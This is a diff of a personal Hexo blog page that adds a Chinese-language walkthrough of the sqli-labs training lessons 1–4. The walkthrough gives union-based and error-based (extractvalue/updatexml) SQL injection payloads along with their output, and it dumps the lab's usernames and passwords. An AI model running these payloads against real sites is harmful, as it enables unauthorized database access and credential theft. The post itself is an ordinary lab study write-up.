@@ -11,8 +11,6 @@
   <meta name="generator" content="Hexo 6.0.0">
 
   
-    <meta name="description" content="今天又掉了几根头发？">
-  
 
   
 
@@ -24,7 +22,7 @@
 
   
 
-  <title>Hello World | Liv_binz</title>
+  <title>SQL注入-sqli-labs-less1-4 | Liv_binz</title>
 
   
 
@@ -47,7 +45,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(/wallpaper.jpg)"></div>
+    <div class="post-image" style="background-image: url(/cover.jpg)"></div>
   
 
   <!-- navbar -->
@@ -92,16 +90,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">Hello World</h1>
+          <h1 class="title-wrap">SQL注入-sqli-labs-less1-4</h1>
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-25T00:48:57.752Z" itemprop="datePublished">2022-01-25</time>
+            <time  class="article-date" datetime="2022-01-25T10:26:33.029Z" itemprop="datePublished">2022-01-25</time>
           </h2>
           <ul class="wrap-list dark">
   
+    <li><a href="/categories/sqli/">📒 sqli</a></li>
+  
 </ul>
           <ul class="wrap-list dark">
+  
+    <li><a href="/tags/sqli-labs/">🏷️ sqli-labs</a></li>
   
 </ul>
         </div>
@@ -125,19 +127,102 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <h1 id="Sqli-labs-Less1"><a href="#Sqli-labs-Less1" class="headerlink" title="Sqli-labs Less1"></a>Sqli-labs Less1</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+if true:
+    输出查询内容
+else:
+    print_r(mysql_error());
+</code></pre>
+<ol>
+<li>请求方式— <strong>GET</strong></li>
+<li>包裹方式— <strong>id=‘1’</strong></li>
+<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
+</ol>
+<h2 id="联合注入过程"><a href="#联合注入过程" class="headerlink" title="联合注入过程"></a>联合注入过程</h2><pre><code>?id=1&#39; order by 1 --+
+    回显正常
+?id=1&#39; order by 2 --+
+    回显正常
+?id=1&#39; order by 3 --+
+    回显正常
+?id=1&#39; order by 4 --+
+    回显错误
+</code></pre>
+<p>证明列数=3</p>
+<pre><code>查库：
+?id=-1&#39; union select 1,2,database() --+
+回显：
+Your Login name:2
+Your Password:security
+</code></pre>
+<p>当前库名为：security</p>
+<pre><code>查表：
+?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+
+#注意：用16进制避免了单括号的出现
+回显：
+Your Login name:2
+Your Password:emails,referers,uagents,users
+</code></pre>
+<p>当前库内表名为：emails,referers,uagents,users</p>
+<pre><code>查users表的列：
+?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 --+
+回显：
+Your Login name:2
+Your Password:id,username,password
+</code></pre>
+<p>当前表内列名为：id,username,password</p>
+<pre><code>查字段：
+?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users --+
+回显：
+Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+</code></pre>
+<p>以上</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="0x0-原理"><a href="#0x0-原理" class="headerlink" title="0x0 原理"></a>0x0 原理</h3><p><strong>0x1 基于格式错误的报错</strong></p>
+<p><strong>1.  extractvalue()</strong></p>
+<p>正确使用格式：extractvalue(xml_document,Xpath_string)</p>
+<p>作用：从document中返回包含string的字符</p>
+<p>分析： 因为报错中会返回 Xpath_string 所以在此处构造语句 即可在报错中看见所需要的相关信息</p>
+<p>利用 <strong>~ (0x7e) # (0x23) $ (0x24)</strong> 不符合Xpath的语法规则这一点构造语句</p>
+<p><strong>2. updatexml()</strong></p>
+<p>正确使用格式：updatexml(xml_document,xpath_string,new_value)</p>
+<p>作用：将document中含有string的字符改成new_value</p>
+<p>原理与extractvalue()函数相同，不再赘述</p>
+<p><strong>0x2 基于主键重复的报错</strong></p>
+<h3 id="1x0-注入过程"><a href="#1x0-注入过程" class="headerlink" title="1x0 注入过程"></a>1x0 注入过程</h3><p><strong>1x1 基于格式错误的报错</strong></p>
+<p><strong>1. extractvalue()</strong></p>
+<pre><code>查库：
+?id=-1&#39; and extractvalue(1,concat(0x7e,(select database())))--+
+回显：
+XPATH syntax error: &#39;~security&#39;
+</code></pre>
+<p>当前库名为security</p>
+<pre><code>查表：
+?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)))--+
+回显：
+XPATH syntax error: &#39;~emails,referers,uagents,users&#39; 
+</code></pre>
+<p>当前库内表名为：emails,referers,uagents,users</p>
+<pre><code>查users表的列：
+?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273)))--+
+回显：
+XPATH syntax error: &#39;~id,username,password&#39;
+</code></pre>
+<p>当前表内列名为：id,username,password</p>
+<pre><code>查字段：
+?id=-1&#39; and extractvalue(1,concat(0x7e,(select group_concat(username) from users)))--+
+回显：
+XPATH syntax error: &#39;~Dumb,Angelina,Dummy,secure,stup&#39;
+</code></pre>
+<p>注意：报错信息最多显示32位 若需要全部信息 运用limit构造payload如下</p>
+<pre><code>查字段：
+?id=-1&#39; and extractvalue(1,concat(0x7e,(select username from users limit+0,1))) --+
+回显：
+XPATH syntax error: &#39;~Dumb&#39;
+</code></pre>
+<p>limit+0,1依次偏移来获取全部数据</p>
+<p><strong>2. updatexml()</strong></p>
+<p>注入过程与extractvalue()函数相同，不再赘述</p>
+<p><strong>1x2 基于主键重复的报错</strong></p>
 
       </section>
 
@@ -181,13 +266,13 @@
         <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
 </svg>
-        0
+        1
       </div>
       <div class="count-box--item">
         <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
 </svg>
-        0
+        1
       </div>
     </div>
   </div>
@@ -219,6 +304,12 @@
   <div class="widget-body">
     <ul class="categorys-list">
       
+        <li class="categorys-list-item">
+          <a href="/categories/sqli/">
+            sqli (1)
+          </a>
+        </li>
+      
     </ul>
   </div>
 </section>
@@ -232,7 +323,7 @@
   </div>
   <div class="widget-body">
     <div class="tags-cloud">
-      
+      <a href="/tags/sqli-labs/" style="font-size: 10px;" class="tags-cloud-0">sqli-labs</a>
     </div>
   </div>
 </section>
